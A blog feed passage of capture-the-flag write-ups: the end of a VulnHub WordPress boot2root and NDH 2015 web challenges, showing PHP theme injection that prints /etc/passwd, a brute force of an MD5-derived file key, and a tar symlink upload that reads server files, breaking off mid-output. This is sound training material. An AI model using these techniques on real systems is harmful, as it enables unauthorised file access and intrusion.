&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="x"&gt; &lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nv"&gt;$myfile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;fopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/etc/passwd&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;or&lt;/span&gt; &lt;span class="k"&gt;die&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Unable to open file!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nb"&gt;fread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$myfile&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;filesize&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/etc/passwd&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;fclose&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$myfile&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;When we reload the index page we got the &lt;code&gt;/etc/password&lt;/code&gt; file in the footer:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root:x:0:0:root:/root:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;bin:x:2:2:bin:/bin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;sys:x:3:3:sys:/dev:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;sync:x:4:65534:sync:/bin:/bin/sync&lt;/span&gt;
&lt;span class="code-line"&gt;games:x:5:60:games:/usr/games:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;man:x:6:12:man:/var/cache/man:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;mail:x:8:8:mail:/var/mail:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;news:x:9:9:news:/var/spool/news:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;proxy:x:13:13:proxy:/bin:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;backup:x:34:34:backup:/var/backups:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin&lt;/span&gt;
&lt;span class="code-line"&gt;libuuid:x:100:101::/var/lib/libuuid:&lt;/span&gt;
&lt;span class="code-line"&gt;syslog:x:101:104::/home/syslog:/bin/false&lt;/span&gt;
&lt;span class="code-line"&gt;messagebus:x:102:105::/var/run/dbus:/bin/false&lt;/span&gt;
&lt;span class="code-line"&gt;user:x:1000:1000:user,,,:/home/user:/bin/bash&lt;/span&gt;
&lt;span class="code-line"&gt;mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false&lt;/span&gt;
&lt;span class="code-line"&gt;candycane:x:1001:1001::/home/candycane:&lt;/span&gt;
&lt;span class="code-line"&gt;# YOU STOLE MY SECRET FILE!&lt;/span&gt;
&lt;span class="code-line"&gt;# SECRET = &amp;quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Wut? We already got the flag!
No need to root the system… sadly.&lt;/p&gt;
&lt;p&gt;As there is not ssh port open, I tried to log on the VM with
&lt;code&gt;root:SuperSecretPassword&lt;/code&gt; and it simply worked.&lt;/p&gt;
&lt;h1 id="summary"&gt;Summary&lt;/h1&gt;
&lt;p&gt;This was a simple challenge, based on web pentesting.
It was a bit short but nonetheless interesting.&lt;/p&gt;
&lt;p&gt;Road to flag:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SQL injection on the &lt;code&gt;/login.php&lt;/code&gt; interface&lt;/li&gt;
&lt;li&gt;Get the wordpress admin password&lt;/li&gt;
&lt;li&gt;As wordpress admin inject PHP code in the web site (via the theme)&lt;/li&gt;
&lt;li&gt;Display &lt;code&gt;/etc/passwd&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Flag : &lt;strong&gt;"NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"&lt;/strong&gt;&lt;/p&gt;</content><category term="Security"></category><category term="challenge"></category><category term="security"></category><category term="vulnhub"></category><category term="boot2root"></category><category term="linux"></category></entry><entry><title>CTF NDH Qualifications</title><link href="https://maggick.fr/2015/04/ctf-ndh-qualifications.html" rel="alternate"></link><published>2015-04-07T00:00:00+02:00</published><updated>2015-04-07T00:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2015-04-07:/2015/04/ctf-ndh-qualifications.html</id><summary type="html">&lt;p&gt;&lt;img alt="Logo NDH" class="align-left" src="/media/2015.04/ndh_logo.png" width="202"/&gt;&lt;/p&gt;
&lt;p&gt;This weekend (4 April 2015) take place the qualification round for
&lt;a href="https://nuitduhack.com/en/"&gt;"Nuit du Hack" CTF&lt;/a&gt; from 00:01 to 23:59. It was a
Jeopardy CTF.&lt;/p&gt;
&lt;p&gt;I have participated with the &lt;a href="http://www.zenk-security.com/"&gt;Zenk-Security&lt;/a&gt; team.
At the end we got the 7th position and are qualified for the final which would
be a Attack-Defense CTF in Paris in June.&lt;/p&gt;
&lt;p&gt;I publish here the ones for the challenges I participated to and make a writeup
of. All the writeup for this CTF are
&lt;a href="http://wiki.zenk-security.com/doku.php?id=ndh_2015_quals"&gt;accessible here (in french)&lt;/a&gt;.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2015.04/ndh_logo.png" alt="Logo NDH"
width="202"&gt;&lt;/p&gt;
&lt;p&gt;This weekend (4 April 2015) take place the qualification round for
&lt;a href="https://nuitduhack.com/en/"&gt;"Nuit du Hack" CTF&lt;/a&gt; from 00:01 to 23:59. It was a
Jeopardy CTF.&lt;/p&gt;
&lt;p&gt;I have participated with the &lt;a href="http://www.zenk-security.com/"&gt;Zenk-Security&lt;/a&gt; team.
At the end we got the 7th position and are qualified for the final which would
be a Attack-Defense CTF in Paris in June.&lt;/p&gt;
&lt;p&gt;I publish here the ones for the challenges I participated to and make a writeup
of. All the writeup for this CTF are
&lt;a href="http://wiki.zenk-security.com/doku.php?id=ndh_2015_quals"&gt;accessible here (in french)&lt;/a&gt;.&lt;/p&gt;


&lt;p&gt;This article is a bit long, so here is the list of the available writeup :&lt;/p&gt;
&lt;h1 id="menu"&gt;Menu:&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#facebox"&gt;FaceBox&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#facesec"&gt;FaceSec&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#secureauth"&gt;SecureAuth&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#updator"&gt;Updator&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#raptor"&gt;Raptor&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id="facebox"&gt;FaceBox&lt;/h1&gt;
&lt;p&gt;Web   | 100 points  | http://quals.nuitduhack.com/challenges/view/10&lt;/p&gt;
&lt;p&gt;http://prod.facebox.challs.nuitduhack.com/&lt;/p&gt;
&lt;h2 id="statement"&gt;Statement&lt;/h2&gt;
&lt;p&gt;*A shady company decided to write their own software for storing files in the
cloud.&lt;/p&gt;
&lt;p&gt;"No no no, this is OUR filebox. We decline any responsability in the usage of our
filebox. In any event your files get lost, trashed, stolen or spy on : it's
your fault, not ours."&lt;/p&gt;
&lt;p&gt;You are investigating on the security of their cloud storage as it might have
disastrous consequences if it were to get hacked by malicious actors.*&lt;/p&gt;
&lt;h2 id="challenge"&gt;Challenge&lt;/h2&gt;
&lt;p&gt;The website prod.facebox.challs.nuitduhack.com allow us to create an account and
log ourself. Then we can upload files on the server both in public and private
mod. In this case the link to the file is hide to the other users.&lt;/p&gt;
&lt;h3 id="file-upload"&gt;File Upload&lt;/h3&gt;
&lt;p&gt;We tried to upload files and execute some code on the server. It was a
waste of time. Then we think that if there was a prod, there should also be a
dev.&lt;/p&gt;
&lt;h3 id="dev"&gt;dev&lt;/h3&gt;
&lt;p&gt;With http://dev.facebox.challs.nuitduhack.com/ we found a git project with the
following tree:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;http://dev.facebox.challs.nuitduhack.com/.git/config&lt;/span&gt;
&lt;span class="code-line"&gt;http://dev.facebox.challs.nuitduhack.com/.git/COMMIT_EDITMSG&lt;/span&gt;
&lt;span class="code-line"&gt;http://dev.facebox.challs.nuitduhack.com/.git/HEAD&lt;/span&gt;
&lt;span class="code-line"&gt;http://dev.facebox.challs.nuitduhack.com/.git/refs/heads/master&lt;/span&gt;
&lt;span class="code-line"&gt;http://dev.facebox.challs.nuitduhack.com/.git/logs/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The page http://dev.facebox.challs.nuitduhack.com/.git/COMMIT_EDITMSG show the
last commit messages: &lt;em&gt;hash generation function&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;We can easily retrieve all files on this repository with &lt;code&gt;rip-git.pl&lt;/code&gt;:
https://github.com/ctfs/write-ups-2014/tree/master/9447-ctf-2014/tumorous
https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-git.pl&lt;/p&gt;
&lt;h3 id="a-bit-of-python"&gt;A bit of python&lt;/h3&gt;
&lt;p&gt;With &lt;code&gt;rip-git.pl&lt;/code&gt; we found the python script that generate the link of the
uploaded files:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/usr/bin/env python&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;# -*- coding: utf-8 -*-&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;generate_random_filename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;dbuser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter_by&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;user_id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;first&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;dbuser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;privkey&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="kc"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dbuser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;privkey&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;privkey&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10000000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;99999999&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;upd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter_by&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;user_id&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;first&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;upd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;privkey&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;privkey&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;commit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;privkey&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id="private-file"&gt;Private file&lt;/h3&gt;
&lt;p&gt;We have been asked to test the application security. The private file access
seems a interesting vulnerability. The first two files were probably upload by
the staff.
Then we will try to get the &lt;strong&gt;confidentials.txt&lt;/strong&gt; file upload by the user koffi.
Hopfuly a second file was upload by this user: &lt;strong&gt;paste1.txt&lt;/strong&gt; at the address
http://prod.facebox.challs.nuitduhack.com/files/view/3686d78a6e9d5258773a6ae0469d3ed4&lt;/p&gt;
&lt;p&gt;In order to find the private key of the koffi user, we quickly inverse the
previous script and we brute force the private key in order to found the good
link with the url of the &lt;strong&gt;paste1.txt&lt;/strong&gt; file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;hashlib&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10000000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;100000000&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;10000000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;paste01.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;3686d78a6e9d5258773a6ae0469d3ed4&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;privkey found: &lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Done!&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Result: &lt;strong&gt;privkey found: 95594864&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;With this private key we applied the algorithm to the &lt;strong&gt;crendentials.txt&lt;/strong&gt; file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;hashlib&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;generate_random_filename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;privkey&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;95594864&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;md5&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;privkey&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;generate_random_filename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;koffi&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;confidentials.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Result: &lt;strong&gt;35e2cb0b2e8bd40347ecd4e32767a060&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We have the complete url to access the private file:
http://prod.facebox.challs.nuitduhack.com/files/view/35e2cb0b2e8bd40347ecd4e32767a060&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Flag: M4x_M4i5_DR&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id="facesec"&gt;FaceSec&lt;/h1&gt;
&lt;p&gt;Web   | 100 points  | http://quals.nuitduhack.com/challenges/view/11&lt;/p&gt;
&lt;p&gt;http://facesec.challs.nuitduhack.com/&lt;/p&gt;
&lt;h2 id="statement_1"&gt;Statement&lt;/h2&gt;
&lt;p&gt;*"Hello there,&lt;/p&gt;
&lt;p&gt;We are looking for a developer or security consultant to secure our filebox
system. We stumbled upon your LinkedIn profile and it seems like you would be a
perfect candidate for this job. Could you please send us your CV and Motivation
letter?&lt;/p&gt;
&lt;p&gt;Thanks,&lt;/p&gt;
&lt;p&gt;faceSec HR Director."*&lt;/p&gt;
&lt;h2 id="challenge_1"&gt;Challenge&lt;/h2&gt;
&lt;p&gt;This challenge allow us to register an account and then upload text file as
resume and motivation letter in order to apply for a job.
We can also upload a compressed file (tar) with a cv.txt and a motiv.txt in
order to upload both files at the same time.&lt;/p&gt;
&lt;h3 id="facebook"&gt;Facebook&lt;/h3&gt;
&lt;p&gt;This challenge looks like the Facebook vulnerability discover last December:
http://josipfranjkovic.blogspot.fr/2014/12/reading-local-files-from-facebooks.html
nevertheless we must upload a .tar file instead of a .zip file.&lt;/p&gt;
&lt;h3 id="a-bit-of-symbolic-link"&gt;A bit of symbolic link&lt;/h3&gt;
&lt;p&gt;We create a &lt;code&gt;cv.txt&lt;/code&gt; file with a symbolic link to &lt;code&gt;/etc/passwd&lt;/code&gt; and a
&lt;code&gt;motiv.txt&lt;/code&gt; file with random content and then tar the two files:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ln -s /etc/passwd cv.txt&lt;/span&gt;
&lt;span class="code-line"&gt;echo plop &amp;gt; motiv.txt&lt;/span&gt;
&lt;span class="code-line"&gt;tar cvf tar.tar *.txt&lt;/span&gt;
&lt;span class="code-line"&gt;    cv.txt&lt;/span&gt;
&lt;span class="code-line"&gt;    motiv.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We upload the file &lt;code&gt;tar.tar&lt;/code&gt; and we get as excepted the &lt;code&gt;/etc/passwd&lt;/code&gt; file from
the server:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bash&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;daemon&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;daemon&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="sr"&gt;/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/s&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
